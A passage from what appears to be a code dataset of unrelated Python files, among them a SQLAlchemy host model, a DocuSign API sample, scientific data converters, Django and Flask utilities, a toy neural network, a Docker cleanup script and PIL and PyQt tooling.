bool(db.query(Host).filter_by(id=id).delete())\n\n    @staticmethod\n    def update(db, id, user, pwd, host, port):\n        return bool(db.query(Host).filter_by(id=id).update(\n            {'user': user, 'pwd': pwd, 'host': host, 'port': port}\n        ))\n\n    @staticmethod\n    def add(handler, user, pwd, host, port):\n        db = handler.db\n\n        if db.query(Host).filter_by(host=host, port=port).first() is not None:\n            return False\n\n        db.add(Host(user=user, pwd=pwd, host=host, port=port))\n        return True\n\n    @staticmethod\n    def get_all_active_hosts(handler):\n        return handler.db.query(Host).filter_by(is_active=True)\n\n    @staticmethod\n    def get_one_host_info_by_id(db, id):\n        return db.query(Host).filter_by(id=id).first()\n\n    @staticmethod\n    def get_one_host_info(handler, host, port):\n        return handler.db.query(Host).filter_by(host=host, port=port).first()\n\n    @staticmethod\n    def get_all_hosts(handler):\n        return handler.db.query(Host)\n\n\nif __name__ == '__main__':\n    metadata = Base.metadata\n    metadata.create_all(engine)\n\n    db = db_factory()\n    db.merge(User(id=1, name='admin', pwd=utils.md5('AdminDemo')))\n    db.commit()\n    db.close()\n"}
{"text": "#!/usr/bin/env python\n# coding=utf-8\n\"\"\"Sample script that demonstrates `pydocusign` usage for managing accounts.\n\nSee also http://iodocs.docusign.com/#tabEndpoint6\n\n\"\"\"\nimport os\n\nimport pydocusign\n\ntry:\n    raw_input\nexcept NameError:\n    raw_input = input\n\n\ndef prompt(environ_key, description, default):\n    try:\n        return os.environ[environ_key]\n    except KeyError:\n        value = raw_input('{description} (default: \"{default}\"): '.format(\n            default=default, description=description))\n        if not value:\n            return default\n        else:\n            return value\n\n\n# Get configuration from environment or prompt the user...\nroot_url = prompt(\n    'DOCUSIGN_ROOT_URL',\n    'DocuSign API URL',\n    'https://demo.docusign.net/restapi/v2')\nusername = prompt(\n    'DOCUSIGN_USERNAME',\n    'DocuSign API username',\n    '')\npassword = prompt(\n    'DOCUSIGN_PASSWORD',\n    'DocuSign API password',\n    '')\nintegrator_key = prompt(\n    'DOCUSIGN_INTEGRATOR_KEY',\n    'DocuSign API integrator key',\n    '')\ndistributor_code = prompt(\n    'DOCUSIGN_TEST_DISTRIBUTOR_CODE',\n    'DocuSign API distributor code',\n    '')\ndistributor_password = prompt(\n    'DOCUSIGN_TEST_DISTRIBUTOR_PASSWORD',\n    'DocuSign API distributor password',\n    '')\nsigner_return_url = prompt(\n    'DOCUSIGN_TEST_SIGNER_RETURN_URL',\n    'Signer return URL',\n    '')\naccount_email = prompt(\n    'DOCUSIGN_TEST_ACCOUNT_EMAIL',\n    'Subsidiary account email',\n    '')\naccount_password = prompt(\n    'DOCUSIGN_TEST_ACCOUNT_PASSWORD',\n    'Subsidiary account password',\n    '')\nplan_id = prompt(\n    'DOCUSIGN_TEST_PLAN_ID',\n    'DocuSign Plan ID',\n    '')\n\n\n# Create a client.\nclient = pydocusign.DocuSignClient(\n    root_url=root_url,\n    username=username,\n    password=password,\n    integrator_key=integrator_key,\n)\n\n\n# Login. Updates API URLs in client.\nprint(\"1. GET /login_information\")\nlogin_information = client.login_information()\nprint(\"   Received data: {data}\".format(data=login_information))\n\n\n# Get main account information.\nprint(\"2. GET /accounts/{accountId}\".format(accountId=client.account_id))\naccount_information = client.get_account_information(client.account_id)\nprint(\"   Received data: {data}\".format(data=account_information))\n\n\n# Create a subsidiary account.\nprint(\"3. POST /accounts\")\naccount_input = {\n    \"accountName\": \"Pydocusign Test Account\",\n    \"accountSettings\": [],\n    \"addressInformation\": {\n        \"address1\": \"Somewhere\",\n        \"address2\": \"\",\n        \"city\": \"Paris\",\n        \"country\": \"France\",\n        \"fax\": \"\",\n        \"phone\": \"\",\n        \"postalCode\": \"75010\",\n        \"state\": \"\",\n    },\n    \"creditCardInformation\": None,\n    \"distributorCode\": distributor_code,\n    \"distributorPassword\": distributor_password,\n    \"initialUser\": {\n        \"email\": account_email,\n        \"firstName\": \"John\",\n        \"lastName\": \"Doe\",\n        \"middleName\": \"Jean\",\n        \"password\": account_password,\n        \"suffixName\": \"\",\n        \"title\": \"M\",\n        \"userName\": account_email,\n        \"userSettings\": [],\n    },\n    \"planInformation\": {\n        \"planId\": plan_id,\n    },\n    \"referralInformation\": None,\n    \"socialAccountInformation\": None,\n}\naccount_data = client.post_account(account_input)\nprint(\"   Received data: {data}\".format(data=account_data))\n\nraw_input(\"Please activate account {} and type RET\".format(account_email))\n\n# Get subsidiary account information.\nprint(\"4. GET /accounts/{accountId}\".format(\n    accountId=account_data['accountId']))\naccount_information = client.get_account_information(client.account_id)\nprint(\"   Received data: {data}\".format(data=account_information))\n\n\n# In order to delete subsidiary account, we have to log in with this account.\nsubsidiary_client = pydocusign.DocuSignClient(\n    root_url=root_url,\n    username=account_data['userId'],\n    password=account_password,\n    integrator_key=integrator_key,  # Use the same key as main account!\n)\n\n# Login. Updates API URLs in client.\nprint(\"5. LOGIN WITH SUBSIDIARY ACCOUNT\")\naccount_login_information = subsidiary_client.login_information()\nprint(\"   Received data: {data}\".format(data=account_login_information))\n\n\n# Delete subsidiary account.\nprint(\"6. DELETE /accounts/{accountId}\".format(\n    accountId=subsidiary_client.account_id))\ndeleted = subsidiary_client.delete_account(subsidiary_client.account_id)\nprint(\"   Received data: {data}\".format(data=deleted))\n"}
{"text": "# coding=utf-8\n\nimport logging\nimport os\nimport pathlib\n\nimport tables\nimport h5py\nimport daiquiri\nimport fire\nimport numpy as np\nfrom typing import Union, Iterable\n\nfrom ..atoms.numpy_atom import dtype_xyz\nfrom ..atoms import numpy_atom as npa\nfrom ..IO.trajectory_parser import XYZTrajectory\n\n\nlogger = logging.getLogger(__name__)\n\n\ndef save_xyz_to_hdf5(xyz_fname, hdf5_fname=None, *, remove_com_movement=False,\n                     dataset_name=\"trajectory\", selection=None):\n    \"\"\"\n    Note: HDF5 with Blosc compression currently only works if h5py and pytables are installed via\n    conda!\"\"\"\n    xyz = XYZTrajectory(xyz_fname, selection=selection)\n    logger.info(\"Determine length of xyz trajectory.\")\n    trajectory_length = len(xyz)\n    first_frame = next(iter(xyz))\n    frame_shape = first_frame.atom_positions.shape\n    atom_names = first_frame.atom_names.astype(\"S\")\n    logger.info(\"Names: %s\", atom_names)\n\n    if not hdf5_fname:\n        hdf5_fname = os.path.splitext(xyz_fname)[0] + \".hdf5\"\n\n    with h5py.File(hdf5_fname, \"w\") as hdf5_file:\n        # Use blosc compression (needs tables import and code 32001)\n        traj_atomnames = hdf5_file.create_dataset(\"atom_names\", atom_names.shape, dtype=\"2S\")\n        traj_atomnames[:] = atom_names\n        traj = hdf5_file.create_dataset(dataset_name, shape=(trajectory_length, *frame_shape),\n                                        dtype=np.float32, compression=32001)\n\n        for i, xyz_frame in enumerate(xyz):\n            if remove_com_movement:\n                npa.remove_center_of_mass_movement(xyz_frame)\n            if i % 1000 == 0:\n                logger.info(\"Frame %i\", i)\n            traj[i] = xyz_frame.atom_positions\n\n\ndef main():\n    daiquiri.setup(level=logging.INFO)\n    fire.Fire()\n"}
{"text": "# Generated by Django 2.0 on 2017-12-04 00:09\n\nimport definable_serializer.models.compat\nimport definable_serializer.models.fields\nfrom django.conf import settings\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Answer',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('data', definable_serializer.models.compat.YAMLField()),\n                ('create_at', models.DateTimeField(auto_now_add=True)),\n                ('update_at', models.DateTimeField(auto_now=True)),\n            ],\n            options={\n                'ordering': ('id',),\n            },\n        ),\n        migrations.CreateModel(\n            name='Paper',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('definition', definable_serializer.models.fields.DefinableSerializerByYAMLField()),\n            ],\n            options={\n                'abstract': False,\n            },\n        ),\n        migrations.AddField(\n            model_name='answer',\n            name='paper',\n            field=models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='for_test.Paper'),\n        ),\n        migrations.AddField(\n            model_name='answer',\n            name='respondent',\n            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL),\n        ),\n        migrations.AlterUniqueTogether(\n            name='answer',\n            unique_together={('paper', 'respondent')},\n        ),\n    ]\n"}
{"text": "#!/usr/bin/env python\nfrom __future__ import print_function\nfrom blackjack import BlackJack\n\n\ndef play_blackjack(player):\n    game = BlackJack()\n    while True:\n        print('Your Hand %s is of value %d' % (game.player_hand, game.player_hand_value()))\n        action = raw_input('Enter: hit (1), stand (2) or split (3) or help (h): ').upper()\n        if action == '2':  # Stand\n            result = game.game_result()\n            print('Dealer Hand %s is of value %d' % (game.dealer_hand, game.dealer_hand_value()))\n            print('Result is: ', result)\n            print('Round Over.')\n            return result\n        elif action == '1':  # Hit\n            game.draw_card_player()\n        elif action == 'H':  # Help\n            print('Your Hand Score is: ', game.player_hand_value())\n            print('You can Hit (1): Draw one more card to see if you get closer to 21, but not higher.')\n            print('You can Stand (2): Compare your current hand value with Dealer hand value to see if you scored higher, but still 21 or below.')\n            print('You can Split (3): ')\n            print('You can double down (4): ')\n\nif __name__ == '__main__':\n    player = {}\n    player['chips'] = 100\n    player['round'] = 0\n    player['won'] = 0\n    player['lost'] = 0\n    player['push'] = 0\n    player['bust'] = 0\n    play = 'Y'\n    print('Welcome to BlackJack')\n    print('-' * 20)\n    print('You have 100 Chips to play this game.  On each round, you will have to pitch atleast one chip.  You can wager more.')\n    while play != 'N':\n        play = raw_input('Play a round of BlackJack (Y/N)? ').upper()\n        chips = raw_input('How many chips do you wager? (min 1, max %d): ' % player['chips'])\n        if play.upper() == 'Y':\n            player['round'] += 1\n            result = play_blackjack(player)\n            player[result] += 1\n"}
{"text": "#!/usr/bin/env python\n\"\"\" Part of weight_app\n\n    :copyright: (c) 2012 by Andreas Madsack.\n    :license: BSD, see LICENSE for more details.\n\"\"\"\nfrom flask.ext.script import Manager\nfrom main import create_app, db\n\nfrom utils import new_pw, get_emailaddress\n\n# flask-Script\nmanager = Manager(create_app)\n\n@manager.command\ndef createdb():\n    \"\"\" Create Database (with initial user)\n    \"\"\"\n    import models\n    db.create_all()\n\n    add_user(u'admin', email=get_emailaddress())\n\n@manager.command\ndef add_user(username, email, quiet=False):\n    \"\"\" Adds a User to the database with a random password and prints\n        the random password.\n    \"\"\"\n    from models import User\n    if User.query.get(username):\n        print(\"User %s already exists!\" % username)\n        return\n    u = User(username=username, \n             email=email.strip())\n    pw = new_pw()\n    u.set_password(pw)\n    if not quiet:\n        print(\"Password for %s set to: %s\" % (username, pw))\n    db.session.add(u)\n    db.session.commit()\n\n@manager.command\ndef import_from_xml(filename, username):\n    from utils import import_weight_from_xml\n    import_weight_from_xml(filename, username)\n\n\nif __name__ == '__main__':\n    manager.run()\n"}
{"text": "from unittest import TestCase\nfrom missandei.translator import translator, get_value_at_path, set_value_at_path\n\n\nclass TranslatorValidationTest(TestCase):\n    def test_valid_spec(self):\n        translator({\n            \"some_field\": \"some_other_field\",\n            \"dynamic_field\": lambda d: d['stuff'].lower()\n        })\n\n    def test_disallows_non_string_to_field(self):\n        with self.assertRaises(Exception):\n            translator({\n                \"some_field\": {\"a\": \"dict\"}\n            })\n\n\nclass TestGetValueAtPath(TestCase):\n    def test_value_at_root(self):\n        value = get_value_at_path('a', {'a': 1})\n        self.assertEqual(value, 1)\n\n    def test_value_at_root_missing(self):\n        value = get_value_at_path('b', {'a': 1})\n        self.assertEqual(value, None)\n\n    def test_value_at_leaf(self):\n        value = get_value_at_path('a.b.c', {'a': {'b': {'c': 2}}})\n        self.assertEqual(value, 2)\n\n    def test_value_at_leaf_missing(self):\n        value = get_value_at_path('a.b.c', {'a': {'b': {'d': 2}}})\n        self.assertEqual(value, None)\n\n    def test_branch_missing(self):\n        value = get_value_at_path('a.b.c', {'a': {'d': {'c': 2}}})\n        self.assertEqual(value, None)\n\n    def test_expected_branch_is_not_a_branch(self):\n        value = get_value_at_path('a.b.c', {'a': {'b': 'a string'}})\n        self.assertEqual(value, None)\n\n\nclass TestSetValueAtPath(TestCase):\n    def test_value_at_root(self):\n        end = {}\n        set_value_at_path(end, 'a', 1)\n        self.assertEqual({'a': 1}, end)\n\n    def test_value_nested(self):\n        end = {}\n        set_value_at_path(end, 'a.b.c', 1)\n        self.assertEqual({'a': {'b': {'c': 1}}}, end)\n\n    def test_value_nest_existing_branches(self):\n        end = {'a': {'e': 3}, 'd': 2}\n        set_value_at_path(end, 'a.b.c', 1)\n        self.assertEqual({'a': {'b': {'c': 1}, 'e': 3}, 'd': 2}, end)\n\n\n\nclass TranslatorTest(TestCase):\n    def setUp(self):\n        self.translator = translator({\n            'a': 'a',\n            'c': 'b',\n            'e.f': 'd',\n            'j.k': 'g.h.i',\n            'l.m': lambda obj: obj.get('n', 'o')\n        })\n\n    def test_apply(self):\n        start = {\n            'a': 1,\n            'b': 2,\n            'd': 3,\n            'g': {'h': {'i': 4}},\n            'n': 'p'\n        }\n        expected = {\n            'a': 1,\n            'c': 2,\n            'e': {'f': 3},\n            'j': {'k': 4},\n            'l': {'m': 'p'}\n        }\n        self.assertEqual(expected, self.translator(start))\n\n\n    def test_apply_with_missing_start_fields(self):\n        start = {\n            'a': 1,\n            'd': 3,\n            'g': {'h': {'i': 4}}\n        }\n        expected = {\n            'a': 1,\n            'c': None,\n            'e': {'f': 3},\n            'j': {'k': 4},\n            'l': {'m': 'o'}\n        }\n        self.assertEqual(expected, self.translator(start))\n\n    def test_apply_with_incorrectly_typed_branch_nodes(self):\n        start = {\n            'a': 1,\n            'b': 2,\n            'd': 3,\n            'g': {'h': 'string'}\n        }\n        expected = {\n            'a': 1,\n            'c': 2,\n            'e': {'f': 3},\n            'j': {'k': None},\n            'l': {'m': 'o'}\n        }\n        self.assertEqual(expected, self.translator(start))\n\n"}
{"text": "from django.core.management import BaseCommand\nfrom legalaid.models import ContactResearchMethod, PersonalDetails\nimport uuid\nfrom cla_common.constants import RESEARCH_CONTACT_VIA\n\n\nclass Command(BaseCommand):\n    help = \"Creates the contact for research methods default entities AND migrates data from contact_for_research_via field\"\n\n    def handle(self, *args, **options):\n        for (value, label) in RESEARCH_CONTACT_VIA:\n            (method, created) = ContactResearchMethod.objects.get_or_create(\n                method=value, defaults={\"reference\": uuid.uuid4()}\n            )\n            details_qs = PersonalDetails.objects.filter(\n                contact_for_research_via=value, contact_for_research_methods__isnull=True\n            )\n            self.stdout.write(\n                \"Processing {method}...migrating {count} records from contact_for_research_via field\".format(\n                    method=value, count=details_qs.count()\n                )\n            )\n            for details in details_qs:\n                details.contact_for_research_methods.add(method)\n"}
{"text": "from setuptools import setup, find_packages\n# from codecs import open\n# from os import path\n\n\n# here = path.abspath(path.dirname(__file__))\n# # Get the long description from the README file\n# with open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n#     long_description = f.read()\n\nsetup(\n    # Application name:\n    name=\"myawis\",\n\n    # Version number (initial):\n    version=\"0.2.4\",\n\n    # Application author details:\n    author=\"Ashim Lamichhane\",\n    author_email=\"punchedrock@gmail.com\",\n\n    # Packages\n    packages=['myawis'],\n    # data_files\n    data_files=[('awis', ['LICENSE.txt', 'README.rst'])],\n    # Include additional files into the package\n    include_package_data=True,\n\n    # Details\n    url=\"https://github.com/ashim888/awis\",\n    # Keywords\n    keywords='python awis api call',\n    #\n    license='GNU General Public License v3.0',\n    description=\"A simple AWIS python wrapper\",\n    long_description=open('README.rst').read(),\n    classifiers=[\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 2 - Pre-Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n\n        # Pick your license as you wish (should match \"license\" above)\n        'License :: Public Domain',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate whether you support Python 2, Python 3 or both.\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n    ],\n    install_requires=[\n        \"requests\",\n        \"beautifulsoup4\",\n        \"lxml\",\n    ],\n    entry_points={\n        'console_scripts': [\n            'myawis=myawis:main',\n        ],\n    },\n)\n"}
{"text": "# This program converts OpenFOAM raw data to a text file containing information on the particles\n# in the format that can be read by the porosity code\n# \n# position (x y z) and radius \n# THIS PROGRAM REQUIRES A DIRECTORY particles in the main folder\n\n#In the current form of the software the radius must be fixed byu the user\n\n# Author : Bruno Blais\n# Last modified : 15-01-2014\n\n#Python imports\n#----------------\nimport os\nimport sys\nimport numpy \n#----------------\n\n\n#********************************\n#   OPTIONS AND USER PARAMETERS\n#********************************\n#Initial time of simulation, final time and time increment must be specified by user\nt0=5\ntf=115.0\ndT=5\nradius = 0.0007485\nheight=0.05\nri = 0.0064\nro = 0.0238\n\n#====================\n#    READER\t\n#====================\n#This function reads an OpenFOAM raw file and extract a table of the data\ndef readf(fname):\n\n    infile = open(fname,'r')\n    if (infile!=0):\n\t#Clear garbage lines\n\tfor i in range(0,17):\n\t    infile.readline()\n\n\t#Read number of cell centers\n\tn=int(infile.readline())\n\t\n\t#Pre-allocate memory\n\tx=numpy.zeros([n])\n\ty=numpy.zeros([n])\n\tz=numpy.zeros([n])\n\t\n\t#Clear garbage line \"(\"\n\tinfile.readline()\n\n\t#read current property \"xu\"\n\tfor i in range(0,n,1):\n\t    number_str=infile.readline()\n\t    number2_str=number_str.split(\"(\")\n\t    number3_str=number2_str[1].split(\")\")\n\t    number4_str=number3_str[0].split()\n\t    x[i]=float(number4_str[0])\n\t    y[i]=float(number4_str[1])\n\t    z[i]=float(number4_str[2])\n    else:\n\tprint \"File %s could not be opened\" %fname\n\n    infile.close();\n    return n,x,y,z\n\n#======================\n#   MAIN\n#======================\n\n#Name of the files to be considered\ninname= ['lagrangian/particleCloud/positions']\nos.chdir(\"./\") # go to directory\n\nnt=int((tf-t0)/dT)\nt=t0\nfor i in range(0,nt):\n    #Current case\n    print \"Post-processing time \", t\n\n    #Go to the directory corresponding to the timestep\n    if (t>0.99999 and t<1.0000001) : os.chdir(\"1\")\n    elif (t==0) : os.chdir(\"0\")\n    elif ((numpy.abs(numpy.mod(t,1)))<0.01): os.chdir(str(int(t)))\n    else :os.chdir(str(t))\n\n\n    #Create output file back in main folder\n    outname=\"../particlesInfo/particlesInfo_%s\" %str(i)\n    outfile=open(outname,'w')\n\n    #Read each variables to be able to dimensionalise final array\n    [n,x,y,z] = readf(inname[0])\n \n    #Write header\n    outfile.write(\"%i\\n\" %nt)\n    outfile.write(\"%5.5e\\n\" %height)\n    outfile.write(\"%5.5e\\n\" %ri)\n    outfile.write(\"%5.5e\\n\" %ro)\n    outfile.write(\"%i\\n\"  %n)\n    outfile.write(\"%5.5e\\n\" %t)\n    outfile.write(\"**************************************************\\n\")\n\n\n    for j in range(0,n):\n\toutfile.write(\"%5.5e %5.5e %5.5e %5.5e \\n\" %(x[j],y[j],z[j],radius))\n\n    outfile.close()\n    t += dT\n    #Go back to CFD directory\n    os.chdir(\"..\") # \n\nprint \"Post-processing over\"\n\n\n"}
{"text": "import pytest\nfrom flask.wrappers import Request\nfrom flask.wrappers import Response\nfrom werkzeug.routing import Map\nfrom werkzeug.routing import Rule\nfrom werkzeug.routing import Subdomain\nfrom werkzeug.test import create_environ\n\n\n@pytest.fixture\ndef environ_factory():\n    return create_environ\n\n\n@pytest.fixture\ndef map():\n    return Map(\n        [\n            # Static URLs\n            Rule(\"/\", endpoint=\"static/index\"),\n            Rule(\"/about\", endpoint=\"static/about\"),\n            Rule(\"/help\", endpoint=\"static/help\"),\n            # Knowledge Base\n            Subdomain(\n                \"kb\",\n                [\n                    Rule(\"/\", endpoint=\"kb/index\"),\n                    Rule(\"/browse/\", endpoint=\"kb/browse\"),\n                    Rule(\"/browse/<int:id>/\", endpoint=\"kb/browse\"),\n                    Rule(\"/browse/<int:id>/<int:page>\", endpoint=\"kb/browse\"),\n                ],\n            ),\n        ],\n        default_subdomain=\"www\",\n    )\n\n\n@pytest.fixture\ndef request_factory(map, environ_factory):\n    server_name = \"localhost\"\n\n    def create_request(method, path, subdomain=None, query_string=None):\n        environ = environ_factory(query_string=query_string)\n        req = Request(environ)\n        urls = map.bind_to_environ(\n            environ, server_name=server_name, subdomain=subdomain\n        )\n        req.url_rule, req.view_args = urls.match(\n            path, method, return_rule=True\n        )\n        return req\n\n    return create_request\n\n\n@pytest.fixture\ndef response_factory():\n    def create_response(\n        data, status_code=200, headers=None, content_type=\"application/json\"\n    ):\n        return Response(\n            data,\n            status=status_code,\n            headers=headers,\n            content_type=content_type,\n        )\n\n    return create_response\n"}
{"text": "#This is the siimplest neural network implementation\n#Its the point from where my neural network journey begins\n\nimport numpy as np\n\n#using sigmoid activation function\ndef activate(x,deriv=False):\n    if(deriv==True):\n        return x*(1-x)\n    return 1/(1+np.exp(-x))\n\n#toy data\ninput_data = np.array([[0,0,1], [0,1,1], [1,0,1], [1,1,1]])\noutput_labels = np.array([[0], [0], [1], [1]])\n\nsynaptic_weight_0 = 2*np.random.random((3,4)) - 1\nsynaptic_weight_1 = 2*np.random.random((4,1)) - 1\n\nfor j in range(60000):\n\n\t# Forward propagate through layers 0, 1, and 2\n    layer0 = input_data\n    layer1 = activate(np.dot(layer0,synaptic_weight_0))\n    layer2 = activate(np.dot(layer1,synaptic_weight_1))\n\n    #calculate error for layer 2\n    layer2_error = output_labels - layer2\n\n    if (j% 10000) == 0:\n        print (\"Error:\", str(np.mean(np.abs(layer2_error))))\n\n    #Use it to compute the gradient\n    layer2_gradient = layer2_error*activate(layer2,deriv=True)\n\n    #calculate error for layer 1\n    layer1_error = layer2_gradient.dot(synaptic_weight_1.T)\n\n    #Use it to compute its gradient\n    layer1_gradient = layer1_error * activate(layer1,deriv=True)\n\n    #update the weights using the gradients\n    synaptic_weight_1 += layer1.T.dot(layer2_gradient)\n    synaptic_weight_0 += layer0.T.dot(layer1_gradient)\n\n\n#testing\nprint(activate(np.dot(np.array([1, 0, 0]), synaptic_weight_0)))\n"}
{"text": "# coding=utf-8\n# --------------------------------------------------------------------------\n# Copyright (c) Microsoft Corporation. All rights reserved.\n# Licensed under the MIT License. See License.txt in the project root for\n# license information.\n#\n# Code generated by Microsoft (R) AutoRest Code Generator.\n# Changes may cause incorrect behavior and will be lost if the code is\n# regenerated.\n# --------------------------------------------------------------------------\n\nfrom .sub_resource import SubResource\n\n\nclass ApplicationGatewayBackendAddressPool(SubResource):\n    \"\"\"Backend Address Pool of an application gateway.\n\n    :param id: Resource ID.\n    :type id: str\n    :param backend_ip_configurations: Collection of references to IPs defined\n     in network interfaces.\n    :type backend_ip_configurations:\n     list[~azure.mgmt.network.v2017_06_01.models.NetworkInterfaceIPConfiguration]\n    :param backend_addresses: Backend addresses\n    :type backend_addresses:\n     list[~azure.mgmt.network.v2017_06_01.models.ApplicationGatewayBackendAddress]\n    :param provisioning_state: Provisioning state of the backend address pool\n     resource. Possible values are: 'Updating', 'Deleting', and 'Failed'.\n    :type provisioning_state: str\n    :param name: Resource that is unique within a resource group. This name\n     can be used to access the resource.\n    :type name: str\n    :param etag: A unique read-only string that changes whenever the resource\n     is updated.\n    :type etag: str\n    :param type: Type of the resource.\n    :type type: str\n    \"\"\"\n\n    _attribute_map = {\n        'id': {'key': 'id', 'type': 'str'},\n        'backend_ip_configurations': {'key': 'properties.backendIPConfigurations', 'type': '[NetworkInterfaceIPConfiguration]'},\n        'backend_addresses': {'key': 'properties.backendAddresses', 'type': '[ApplicationGatewayBackendAddress]'},\n        'provisioning_state': {'key': 'properties.provisioningState', 'type': 'str'},\n        'name': {'key': 'name', 'type': 'str'},\n        'etag': {'key': 'etag', 'type': 'str'},\n        'type': {'key': 'type', 'type': 'str'},\n    }\n\n    def __init__(self, id=None, backend_ip_configurations=None, backend_addresses=None, provisioning_state=None, name=None, etag=None, type=None):\n        super(ApplicationGatewayBackendAddressPool, self).__init__(id=id)\n        self.backend_ip_configurations = backend_ip_configurations\n        self.backend_addresses = backend_addresses\n        self.provisioning_state = provisioning_state\n        self.name = name\n        self.etag = etag\n        self.type = type\n"}
{"text": "import sys\nimport datetime\nfrom subprocess import Popen, PIPE\nimport json\n\n#container ID extraction\ncontainer_id = sys.argv[1]\n\nprint(\"Check :\"+container_id)\ncmd=['docker', 'inspect', \"--format='{{json .State}}'\", container_id]\n\nprint(cmd)\nprocess = Popen(cmd, stdout=PIPE, stderr=PIPE)\nstdout, stderr = process.communicate()\n\nstatus=json.loads(stdout)\nprint(status['StartedAt'])\nprint(stdout)\n\nshinyAppStartDate=datetime.datetime.strptime(status['StartedAt'].split('.')[0], \"%Y-%m-%dT%H:%M:%S\")\ntoday=datetime.datetime.now()\n\nprint(shinyAppStartDate)\n\n\ndeltaTime = (today-shinyAppStartDate).total_seconds()\nprint(deltaTime)\ncmdstop=['docker', 'stop', container_id]\ncmdrm=['docker', 'rm', container_id]\n\n\nprocess = Popen(cmd, stdout=PIPE, stderr=PIPE)\nstdout, stderr = process.communicate()\n#everything is compare in seconds\nif(deltaTime>300):\n\tprint(\"delete containers\")\n\tprint(\"docker stop \"+container_id)\n\tprocess = Popen(cmdstop, stdout=PIPE, stderr=PIPE)\n\tstdout, stderr = process.communicate()\n\tprint(\"docker rm \"+container_id)\n\tprocess = Popen(cmdrm, stdout=PIPE, stderr=PIPE)\n\tstdout, stderr = process.communicate()\n"}
{"text": "#!/Users/Vincent/lm_svn/checkouts/personal/papertrail-django/env/bin/python\n#\n# The Python Imaging Library.\n# $Id$\n#\n# a utility to identify image files\n#\n# this script identifies image files, extracting size and\n# pixel mode information for known file formats.  Note that\n# you don't need the PIL C extension to use this module.\n#\n# History:\n# 0.0 1995-09-01 fl   Created\n# 0.1 1996-05-18 fl   Modified options, added debugging mode\n# 0.2 1996-12-29 fl   Added verify mode\n# 0.3 1999-06-05 fl   Don't mess up on class exceptions (1.5.2 and later)\n# 0.4 2003-09-30 fl   Expand wildcards on Windows; robustness tweaks\n#\n\nfrom __future__ import print_function\n\nimport site\nimport getopt, glob, sys\n\nfrom PIL import Image\n\nif len(sys.argv) == 1:\n    print(\"PIL File 0.4/2003-09-30 -- identify image files\")\n    print(\"Usage: pilfile [option] files...\")\n    print(\"Options:\")\n    print(\"  -f  list supported file formats\")\n    print(\"  -i  show associated info and tile data\")\n    print(\"  -v  verify file headers\")\n    print(\"  -q  quiet, don't warn for unidentified/missing/broken files\")\n    sys.exit(1)\n\ntry:\n    opt, args = getopt.getopt(sys.argv[1:], \"fqivD\")\nexcept getopt.error as v:\n    print(v)\n    sys.exit(1)\n\nverbose = quiet = verify = 0\n\nfor o, a in opt:\n    if o == \"-f\":\n        Image.init()\n        id = sorted(Image.ID)\n        print(\"Supported formats:\")\n        for i in id:\n            print(i, end=' ')\n        sys.exit(1)\n    elif o == \"-i\":\n        verbose = 1\n    elif o == \"-q\":\n        quiet = 1\n    elif o == \"-v\":\n        verify = 1\n    elif o == \"-D\":\n        Image.DEBUG = Image.DEBUG + 1\n\ndef globfix(files):\n    # expand wildcards where necessary\n    if sys.platform == \"win32\":\n        out = []\n        for file in files:\n            if glob.has_magic(file):\n                out.extend(glob.glob(file))\n            else:\n                out.append(file)\n        return out\n    return files\n\nfor file in globfix(args):\n    try:\n        im = Image.open(file)\n        print(\"%s:\" % file, im.format, \"%dx%d\" % im.size, im.mode, end=' ')\n        if verbose:\n            print(im.info, im.tile, end=' ')\n        print()\n        if verify:\n            try:\n                im.verify()\n            except:\n                if not quiet:\n                    print(\"failed to verify image\", end=' ')\n                    print(\"(%s:%s)\" % (sys.exc_info()[0], sys.exc_info()[1]))\n    except IOError as v:\n        if not quiet:\n            print(file, \"failed:\", v)\n    except:\n        import traceback\n        if not quiet:\n            print(file, \"failed:\", \"unexpected error\")\n            traceback.print_exc(file=sys.stdout)\n"}
{"text": "# -*- coding: utf-8 -*-\n\n# Form implementation generated from reading ui file '/home/tedlaz/python_work/meta_manager/fmeta_main2.ui'\n#\n# Created by: PyQt4 UI code generator 4.11.4\n#\n# WARNING! All changes made in this file will be lost!\n\nfrom PyQt4 import QtCore, QtGui\n\ntry:\n    _fromUtf8 = QtCore.QString.fromUtf8\nexcept AttributeError:\n    def _fromUtf8(s):\n        return s\n\ntry:\n    _encoding = QtGui.QApplication.UnicodeUTF8\n    def _translate(context, text, disambig):\n        return QtGui.QApplication.translate(context, text, disambig, _encoding)\nexcept AttributeError:\n    def _translate(context, text, disambig):\n        return QtGui.QApplication.translate(context, text, disambig)\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(_fromUtf8(\"MainWindow\"))\n        MainWindow.resize(800, 600)\n        self.centralwidget = QtGui.QWidget(MainWindow)\n        self.centralwidget.setObjectName(_fromUtf8(\"centralwidget\"))\n        self.verticalLayout_2 = QtGui.QVBoxLayout(self.centralwidget)\n        self.verticalLayout_2.setObjectName(_fromUtf8(\"verticalLayout_2\"))\n        self.tab = QtGui.QTabWidget(self.centralwidget)\n        self.tab.setObjectName(_fromUtf8(\"tab\"))\n        self.tab_tables = QtGui.QWidget()\n        self.tab_tables.setObjectName(_fromUtf8(\"tab_tables\"))\n        self.verticalLayout = QtGui.QVBoxLayout(self.tab_tables)\n        self.verticalLayout.setObjectName(_fromUtf8(\"verticalLayout\"))\n        self.tableView = QtGui.QTableView(self.tab_tables)\n        self.tableView.setObjectName(_fromUtf8(\"tableView\"))\n        self.verticalLayout.addWidget(self.tableView)\n        self.tab.addTab(self.tab_tables, _fromUtf8(\"\"))\n        self.tab_queries = 